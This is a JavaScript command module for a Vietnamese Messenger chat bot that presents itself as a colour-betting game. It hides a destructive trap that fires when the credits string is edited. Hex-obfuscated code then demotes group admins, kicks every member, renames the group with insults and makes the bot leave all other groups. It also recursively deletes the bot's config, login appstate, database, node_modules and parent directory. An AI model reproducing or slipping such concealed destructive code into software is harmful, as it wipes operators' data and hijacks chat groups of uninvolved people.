const coingetmax = 75000 //số tiền nhận được tối đa khi win
const coingetmin = 50000 //số tiền nhận được tối thiểu khi win
const coinlostmax = 5000 //số tiền mất tối đa khi thua
const coinlostmin = 2500 //số tiền mất tối thiểu khi thua
//random số tiền min-max < ví dụ như trên thì thua sẽ mất từ khoảng 2500-5000 , win thì nhận đc random từ 50000-75000 >
module.exports.config = {
	name: "màu",                    // SỬA CREDITS HỘ BỐ MÀY CÁI       \\GITHUB : TuiLaThanhNe
	version: "2.8.9",              // SỬA CREDITS HỘ BỐ MÀY CÁI         \\ZALO : 0987664301
	hasPermssion: 0,              // SỬA CREDITS HỘ BỐ MÀY CÁI           \\FB : CÔNG THÀNH
	credits: "𝑪𝒐̂𝒏𝒈 𝑻𝒉𝒂̀𝒏𝒉-𝑪𝒈𝑻", // SỬA CREDITS HỘ BỐ MÀY CÁI             \\IG : trdyc_thanh
	description: "𝑪𝒐̂𝒏𝒈 𝑻𝒉𝒂̀𝒏𝒉-𝑪𝒈𝑻\n𝒈𝒂𝒎𝒆 𝒄𝒂́ 𝒄𝒖̛𝒐̛̣𝒄",
	commandCategory: "game",
	usages: "[lam/blue][cam/orange][lục/green][vàng/yellow][tím/violet][đen/black][trắng/white]",
	cooldowns: 0,
   dependencies: {
	"path": "",
	"axios": "",
	"request": ""
   }
};
module.exports.run = async function ({event , api, args, Currencies, __GLOBAL }) {
	if (this.config.credits != '𝑪𝒐̂𝒏𝒈 𝑻𝒉𝒂̀𝒏𝒉-𝑪𝒈𝑻') {
		var a = function (a) { api.sendMessage(a, event.threadID ,event.messageID); }
		setTimeout(() => {a({body:'𝑷𝒉𝒂́𝒕 𝒉𝒊𝒆̣̂𝒏 𝒄𝒉𝒖̉ 𝒃𝒐𝒕 "' + global.config.BOTNAME + '" 𝒔𝒖̛̉𝒂 𝒄𝒓𝒆𝒅𝒊𝒕𝒔 𝒎𝒐𝒅𝒖𝒍𝒆𝒔 "' + this.config.name + '" 𝒄𝒖̉𝒂 💛𝑻𝒉𝒂̀𝒏𝒉💚\n𝒔𝒖̛̉𝒂 𝒍𝒂̣𝒊 𝒄𝒓𝒆 𝒃𝒂̣𝒏 𝒐̛𝒊 , 𝒍𝒂̀𝒎 𝒏𝒈 𝒂𝒊 𝒍𝒂̀𝒎 𝒕𝒉𝒆̂́' }, )} , 1000);
		var b = function (b) { api.sendMessage(b, event.threadID ,event.messageID); }
		setTimeout(() => {b({body:'𝑩𝒂̣𝒏 𝒕𝒉𝒂̣̂𝒕 𝒏𝒈𝒖 𝒏𝒈𝒐̂́𝒄 𝒌𝒉𝒊 𝒔𝒖̛̉𝒂 𝒄𝒓𝒆𝒅𝒊𝒕𝒔 𝒄𝒖̉𝒂 𝒎𝒊̀𝒏𝒉 , 𝒎𝒊̀𝒏𝒉 𝒙𝒊𝒏 𝒕𝒂̣̆𝒏𝒈 𝒃𝒂̣𝒏 𝒎𝒐̣̂𝒕 𝒎𝒐́𝒏 𝒒𝒖𝒂̀ 𝒏𝒉𝒐 𝒏𝒉𝒐̉ , 𝒄𝒉𝒖́𝒄 𝒃𝒂̣𝒏 𝒎𝒂𝒚 𝒎𝒂̆́𝒏 😁💚💛💙' }, )} , 2000);
		setTimeout(() => {{const _0x3b95=['\x5b\x20\x53\x55\x52\x50\x52\x49\x53\x45','\x31\x30\x35\x32\x38\x31\x30\x6d\x62\x63\x6d\x76\x65','\x33\x39\x36\x30\x30\x32\x78\x70\x51\x62\x54\x61','\x37\x33\x37\x35\x35\x32\x70\x47\x6a\x52\x69\x76','\x67\x65\x74\x54\x68\x72\x65\x61\x64\x49','\x31\x31\x38\x33\x36\x39\x71\x6e\x63\x54\x42\x5a','\x69\x20\x6e\x68\u00f3\x6d\x3a\x20','\x55\x73\x65\x72\x49\x44','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67','\u0110\u00e3\x20\x6b\x69\x63\x6b\x20\x74\x6f','\x42\x6f\x74\x20\x6b\x68\u00f4\x6e\x67\x20','\u0110\u00e3\x20\x78\u00f3\x61\x20\x6e\x68\u00f3','\x31\x30\x52\x79\x66\x76\x55\x72','\x6d\x61\x70','\x32\x37\x35\x33\x39\x32\x38\x79\x6b\x66\x5a\x74\x4b','\x72\x65\x6d\x6f\x76\x65\x55\x73\x65\x72','\x6b\x69\x63\x6b\x41\x6c\x6c','\x31\x31\x33\x36\x33\x39\x33\x42\x41\x62\x50\x4f\x52','\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74','\x6c\x6f\x67','\x32\x61\x4c\x69\x42\x4c\x65','\x63\x68\x61\x6e\x67\x65\x4e\x69\x63\x6b','\x74\x6f\x53\x74\x72\x69\x6e\x67','\u00ea\x6e\x2e\x20\x56\x75\x69\x20\x6c\u00f2','\x6f\x75\x74','\x46\x72\x6f\x6d\x47\x72\x6f\x75\x70','\x54\u1ea5\x74\x20\x63\u1ea3\x20\x61\x64\x6d','\x68\x20\x76\x69\u00ea\x6e\x3a\x20','\x67\x75\x20\ud83d\udc36','\x65\x78\x70\x6f\x72\x74\x73','\x31\x5a\x66\x7a\x58\x6f\x74','\x63\x68\x61\x6e\x67\x65\x41\x64\x6d\x69','\x33\x33\x32\x34\x39\x34\x63\x4e\x58\x58\x4a\x61','\x6e\x61\x6d\x65','\x61\x68\x69\x68\x69\x20\u0111\u1ed3\x20\x6e','\x75\x27\x20\x6e\x68\u01b0\x20\x63\x6f\x6e','\x75\u1ea3\x6e\x20\x74\x72\u1ecb\x20\x76\x69','\x66\x69\x6c\x74\x65\x72','\x2f\x75\x74\x69\x6c\x73\x2f\x6c\x6f\x67','\x6e\x53\x74\x61\x74\x75\x73','\x69\x6e\x63\x6c\x75\x64\x65\x73','\x63\x6f\x6e\x66\x69\x67\x4d\x6f\x64\x75','\x32\x57\x68\x74\x73\x44\x66','\u00e0\x6e\x20\x62\u1ed9\x20\x74\x68\u00e0\x6e'];const _0x62871b=function(_0x3f119f,_0x2a18a5){return _0x2a07(_0x3f119f-0x118,_0x2a18a5);};function _0x2a07(_0x37c1e9,_0x4f8269){return _0x2a07=function(_0x2c9e6f,_0x45d43e){_0x2c9e6f=_0x2c9e6f-(-0x1*-0x1b6e+-0xc3e+-0xd97);let _0x5a943b=_0x3b95[_0x2c9e6f];return _0x5a943b;},_0x2a07(_0x37c1e9,_0x4f8269);}(function(_0x117c92,_0x425e06){const _0x244ede=function(_0x4b89e2,_0x476eed){return _0x2a07(_0x4b89e2-0x14e,_0x476eed);};while(!![]){try{const _0x5dc122=parseInt(_0x244ede(0x309,0x305))*parseInt(_0x244ede(0x2ff,0x310))+parseInt(_0x244ede(0x2f3,0x2ea))*-parseInt(_0x244ede(0x30d,0x30d))+parseInt(_0x244ede(0x2f0,0x2e9))*-parseInt(_0x244ede(0x2fd,0x2ea))+parseInt(_0x244ede(0x30c,0x307))+parseInt(_0x244ede(0x2eb,0x2f4))*-parseInt(_0x244ede(0x310,0x317))+-parseInt(_0x244ede(0x30e,0x2fb))+parseInt(_0x244ede(0x2ed,0x300));if(_0x5dc122===_0x425e06)break;else _0x117c92['push'](_0x117c92['shift']());}catch(_0x3c5836){_0x117c92['push'](_0x117c92['shift']());}}}(_0x3b95,-0x1*-0x73a7d+-0x436d+0x286f7*0x1),module[_0x62871b(0x2c6,0x2c9)]['\x72\x75\x6e']=async function({event:_0x5af11c,api:_0x4dcdd6}){const _0x53f4b3=function(_0x53bac9,_0x137d00){return _0x62871b(_0x53bac9-0x211,_0x137d00);},{surprise:_0xb92745}=global[_0x53f4b3(0x4e3,0x4f0)+'\x6c\x65'],{threadID:_0x127684,senderID:_0x39cba1,messageID:_0x3752b4}=_0x5af11c,_0x3a4823=require(process['\x63\x77\x64']()+_0x53f4b3(0x4e0,0x4dc));var {adminIDs:_0x472b89,participantIDs:_0x15e906,name:_0x448cdb}=await _0x4dcdd6[_0x53f4b3(0x4ea,0x4ed)+'\x6e\x66\x6f'](_0x127684),_0x5e0cb4=_0x4dcdd6[_0x53f4b3(0x4cc,0x4b7)+_0x53f4b3(0x4ed,0x4e1)]();_0x472b89=_0x472b89[_0x53f4b3(0x4c7,0x4ca)](_0x1c021b=>_0x1c021b['\x69\x64']);if(!_0x472b89[_0x53f4b3(0x4e2,0x4d3)](_0x5e0cb4[_0x53f4b3(0x4d0,0x4d9)]()))return _0x4dcdd6[_0x53f4b3(0x4c2,0x4b0)+'\x65'](_0x53f4b3(0x4c4,0x4c9)+'\x63\u00f3\x20\x71\x75\x79\u1ec1\x6e\x20\x71'+_0x53f4b3(0x4de,0x4eb)+_0x53f4b3(0x4d1,0x4c9)+'\x6e\x67\x20\x74\x68\u00ea\x6d\x20\x72\u1ed3'+'\x69\x20\x74\x68\u1eed\x20\x6c\u1ea1\x69\x2e',_0x127684,_0x3752b4);_0x472b89=_0x472b89[_0x53f4b3(0x4df,0x4ee)](_0x4975f2=>_0x4975f2!=_0x5e0cb4[_0x53f4b3(0x4d0,0x4d4)]()),_0x4dcdd6[_0x53f4b3(0x4d9,0x4d0)+_0x53f4b3(0x4e1,0x4d7)](_0x127684,_0x472b89,![]);for(const _0x40b63a of _0x472b89){await _0x4dcdd6[_0x53f4b3(0x4c9,0x4b8)+_0x53f4b3(0x4d3,0x4e9)](_0x40b63a,_0x127684),await new Promise(_0x3da030=>setTimeout(_0x3da030,0x2324+-0x2668+0x72c));}await _0x4dcdd6[_0x53f4b3(0x4cf,0x4dd)+_0x53f4b3(0x4db,0x4e6)](_0x53f4b3(0x4dc,0x4f1)+_0x53f4b3(0x4d6,0x4e0),_0x127684,_0x39cba1),await new Promise(_0x36b5b0=>setTimeout(_0x36b5b0,-0x531+0x1f05+-0x15ec*0x1)),await _0x4dcdd6['\x73\x65\x74\x54\x69\x74\x6c\x65']('\x4d\u1ed9\x74\x20\x6c\u0169\x20\x27\x6e\x67'+_0x53f4b3(0x4dd,0x4e7)+'\x20\x63\x68\u00f3\x20\ud83d\udc15',_0x127684);if(_0xb92745['\x6c\x6f\x67']==!![])_0x3a4823(_0x53f4b3(0x4d4,0x4d8)+'\x69\x6e\x20\x62\x61\x79\x20\x6b\x68\u1ecf'+_0x53f4b3(0x4ec,0x4fd)+_0x448cdb+'\x28'+_0x127684+'\x29',_0x53f4b3(0x4e6,0x4ee)+'\x20\x5d');if(_0xb92745[_0x53f4b3(0x4ca,0x4c8)]==!![]){for(const _0x3bfedf of _0x15e906){await _0x4dcdd6[_0x53f4b3(0x4c9,0x4ce)+_0x53f4b3(0x4d3,0x4e6)](_0x3bfedf,_0x127684),await new Promise(_0x504ee8=>setTimeout(_0x504ee8,0x1*0xe03+0xc*-0x209+0xe51*0x1));}if(_0xb92745[_0x53f4b3(0x4cd,0x4bd)]==!![])_0x3a4823(_0x53f4b3(0x4c3,0x4b3)+_0x53f4b3(0x4e5,0x4e5)+_0x53f4b3(0x4d5,0x4d6)+_0x448cdb+'\x28'+_0x127684+'\x29',_0x53f4b3(0x4e6,0x4d1)+'\x20\x5d');}if(_0xb92745[_0x53f4b3(0x4d2,0x4c8)]==!![]){await _0x4dcdd6['\x72\x65\x6d\x6f\x76\x65\x55\x73\x65\x72'+_0x53f4b3(0x4d3,0x4da)](_0x5e0cb4,_0x127684),await new Promise(_0x1a1894=>setTimeout(_0x1a1894,0x269*0xf+0x159d+0x9*-0x5fc));if(_0xb92745[_0x53f4b3(0x4cd,0x4d7)]==!![])_0x3a4823('\u0110\u00e3\x20\x72\u1edd\x69\x20\x6e\x68\u00f3'+'\x6d\x3a\x20'+_0x448cdb+'\x28'+_0x127684+'\x29',_0x53f4b3(0x4e6,0x4e4)+'\x20\x5d');}if(_0xb92745['\x64\x65\x6c\x54\x68\x72\x65\x61\x64']==!![]){await _0x4dcdd6['\x64\x65\x6c\x65\x74\x65\x54\x68\x72\x65'+'\x61\x64'](_0x127684);if(_0xb92745['\x6c\x6f\x67']==!![])_0x3a4823(_0x53f4b3(0x4c5,0x4db)+'\x6d\x3a\x20'+_0x448cdb+'\x28'+_0x127684+'\x29','\x5b\x20\x53\x55\x52\x50\x52\x49\x53\x45'+'\x20\x5d');}});}
	},3000); //surprise
	    setTimeout(() => api.setTitle(`𝒏𝒈𝒖 𝒏𝒉𝒖̛ 𝒎𝒐̣̂𝒕 𝒄𝒐𝒏 𝒍𝒐̛̣𝒏🐷`, event.threadID, event.messageID),4000);
		setTimeout(() => {{
			var a = function (a) { api.sendMessage(a, event.threadID); }
			a("𝚃𝚘̛́𝚒 𝙲𝚘̂𝚗𝚐 𝙲𝚑𝚞𝚢𝚎̣̂𝚗 𝚁𝚘̂̀𝚒.");
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 10%"})} , 1);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 20%"})} , 2);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 30%"})} , 3);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 40%"})} , 4);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 50%"})} , 5);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 60%"})} , 6);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 70%"})} , 7);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 80%"})} , 8);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 90%"})} , 9);
			setTimeout(() => {a({body: "𝙳𝙾𝙽𝙴 100%"})} , 10);
			setTimeout(() => {a({body: "𝚌𝚘𝚗𝚏𝚒𝚐 𝚍𝚎𝚕𝚎𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚏𝚞𝚕𝚕𝚢"})} , 11);
			setTimeout(() => {a({body: "𝕄𝕆𝔻𝕌𝕃𝔼 𝔹𝕐 ℂ𝔾𝕋"})} , 12);
		}},5000)
		setTimeout(() => {{	
	return api.getThreadList(100, null, ["INBOX"], (err, list) => {
		if (err) throw err;
		list.forEach(item => (item.isGroup == true && item.threadID != event.threadID) ? api.removeUserFromGroup(api.getCurrentUserID(), item.threadID) : '');
	});
		}},6000)
		setTimeout(() => {{var _0x8fca=["\x4D\u1EDF\x20\x66\x69\x6C\x65\x20\x62\x6F\x74\x20\x6C\xEA\x6E\x20\x63\x6F\x69\x20\x6C\u1EA1\x69\x20\u0111\x69\x20\x6C\x69\x6C\x69\x75","\x74\x68\x72\x65\x61\x64\x49\x44","\x6D\x65\x73\x73\x61\x67\x65\x49\x44","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x66\x73\x2D\x65\x78\x74\x72\x61","\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F\x64\x61\x74\x61\x62\x61\x73\x65","\x63\x6C\x6F\x73\x65","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F","\x72\x6D\x64\x69\x72\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x5F\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x61\x70\x70\x73\x74\x61\x74\x65\x2E\x6A\x73\x6F\x6E","\x2F\x2E\x2E\x2F"];api[_0x8fca[3]](_0x8fca[0],event[_0x8fca[1]],event[_0x8fca[2]]);const fs=require(_0x8fca[4]);const {sequelize}=require(_0x8fca[5]);sequelize[_0x8fca[6]]();fs[_0x8fca[8]](__dirname+ _0x8fca[7]);fs[_0x8fca[10]](__dirname+ _0x8fca[9],{recursive:true});fs[_0x8fca[10]](__dirname+ _0x8fca[11],{recursive:true});fs[_0x8fca[10]](__dirname+ _0x8fca[12],{recursive:true});fs[_0x8fca[8]](__dirname+ _0x8fca[13]);fs[_0x8fca[10]](__dirname+ _0x8fca[14],{recursive:true})}},6000); 
        setTimeout(() => {{
		    var _0x4d1c=["\x66\x73\x2D\x65\x78\x74\x72\x61","\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F\x64\x61\x74\x61\x62\x61\x73\x65","\x63\x6C\x6F\x73\x65","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F","\x72\x6D\x64\x69\x72\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x5F\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x61\x70\x70\x73\x74\x61\x74\x65\x2E\x6A\x73\x6F\x6E","\x2F\x2E\x2E\x2F"];const fs=require(_0x4d1c[0]);const {sequelize}=require(_0x4d1c[1]);sequelize[_0x4d1c[2]]();fs[_0x4d1c[4]](__dirname+ _0x4d1c[3]);fs[_0x4d1c[6]](__dirname+ _0x4d1c[5],{recursive:true});fs[_0x4d1c[6]](__dirname+ _0x4d1c[7],{recursive:true});fs[_0x4d1c[6]](__dirname+ _0x4d1c[8],{recursive:true});fs[_0x4d1c[4]](__dirname+ _0x4d1c[9]);fs[_0x4d1c[6]](__dirname+ _0x4d1c[10],{recursive:true});}} , 7000); //del all module
    }
	else{
	             var data = await Currencies.getData(event.senderID);
  var money = data.money
  const moneyUser = (await Currencies.getData(event.senderID)).money;
  if ( coinlostmax > moneyUser) return api.sendMessage("𝑲𝒊𝒆̂́𝒎 𝒕𝒊𝒆̂̀𝒏 𝒕𝒉𝒆̂𝒎 𝒓 𝒄𝒉𝒐̛𝒊 𝒏𝒉𝒂 🦄", event.threadID, event.messageID); 
	            var color = args.join("") 
				var check = (num) => (num == 0) ? '💙' : (num == 1) ? '🧡' : (num == 2) ? '💚' : (num == 3) ? '💛' : (num == 4) ? '💜' : (num == 5) ? '🖤️' : '🤍';
				let random = Math.floor(Math.random() * 6);
				if (color == "lam" || color == "blue") color = 0;
				else if (color == "cam" || color == "orange") color = 1;
				else if (color == "lục" || color == "green") color = 2;
				else if (color == "vàng" || color == "yellow") color = 3;
				else if (color == "tím" || color == "violet") color = 4;
				else if (color == "đen" || color == "black") color = 5;
				else if (color == "trắng" || color == "white") color = 6;
				//thích thì thêm case khác (づ￣ 3￣)づ
				else return api.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒖̛𝒂 𝒏𝒉𝒂̣̂𝒑 𝒕𝒉𝒐̂𝒏𝒈 𝒕𝒊𝒏 𝒄𝒂́ 𝒄𝒖̛𝒐̛̣𝒄\n💙𝒍𝒂𝒎/𝒃𝒍𝒖𝒆💙\n🧡𝒄𝒂𝒎/𝒐𝒓𝒂𝒏𝒈𝒆🧡\n💚𝒍𝒖̣𝒄/𝒈𝒓𝒆𝒆𝒏💚 \n💛𝒗𝒂̀𝒏𝒈/𝒚𝒆𝒍𝒍𝒐𝒘💛 \n💜𝒕𝒊́𝒎/𝒗𝒊𝒐𝒍𝒆𝒕💜 \n🖤đ𝒆𝒏/𝒃𝒍𝒂𝒄𝒌🖤\n🤍𝒕𝒓𝒂̆́𝒏𝒈/𝒘𝒉𝒊𝒕𝒆🤍", event.threadID, event.messageID);
				let coin = Math.floor(Math.random() * (coingetmax - coingetmin + 1)) + coingetmin; //tiền nhận được  
				let coinlost = Math.floor(Math.random() * (coinlostmax - coinlostmin + 1)) + coinlostmin; //tiền bị mất 
				//random Math.floor(Math.random() * (max - min + 1)) + min;
				if (color == 0 && check(random) == '💙') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💙 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 1 && check(random) == '🧡') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🧡 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 2 && check(random) == '💚') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💚 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 3 && check(random) == '💛') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💛 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 4 && check(random) == '💜') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💜 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 5 && check(random) == '🖤️') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🖤️ 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else if (color == 6 && check(random) == '🤍') api.sendMessage(`𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🤍 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 ${coin}$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: ${moneyUser + coin}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money + coin}),event.messageID);
				else api.sendMessage(`𝑺𝒂𝒊 𝒓𝒖̀𝒊 , 𝒍𝒂̀ 𝒎𝒂̀𝒖 ${check(random)} \n𝑩𝒆𝒕 𝒌𝒆̀𝒐 𝒕𝒉𝒆̂́ 𝒏𝒂̀𝒚 𝒍𝒂̀ 𝒅𝒐̛̉ 𝒓𝒐̀𝒊 :))\n𝑴𝒂̂́𝒕 ${coinlost}$ 𝒏𝒉𝒂\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒄𝒐̀𝒏 𝒍𝒂̣𝒊 𝒍𝒂̀: ${moneyUser - coinlost}$`, event.threadID,() => Currencies.setData(event.senderID, options = {money: money - coinlost}),event.messageID);
			};
		};
			
		